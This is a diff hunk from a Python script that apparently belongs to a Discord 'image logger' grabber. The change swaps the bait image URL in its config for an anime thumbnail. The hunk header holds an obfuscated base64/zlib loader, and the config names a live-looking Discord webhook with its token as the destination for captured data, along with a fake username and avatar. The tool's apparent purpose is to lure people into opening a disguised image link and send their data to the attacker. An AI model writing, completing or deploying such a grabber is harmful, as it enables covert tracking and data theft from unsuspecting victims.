@@ -5,7 +5,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1448731282119852072/hoimpRAFZIAdv2MPoxP1kTubJhBGVYeicuVJCZvwL-vsEpygIy8twrBs1rKuNGLCBdZ3",
-    "image": "https://blackyouthproject.com/black-men-toxic-masculinity-steve-stephens/",
+    "image": "https://i0.wp.com/tokyotreatblog.wpcomstaging.com/wp-content/uploads/2025/03/goku-dragon-ball-thumbnail.webp?resize=620%2C327&ssl=1",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
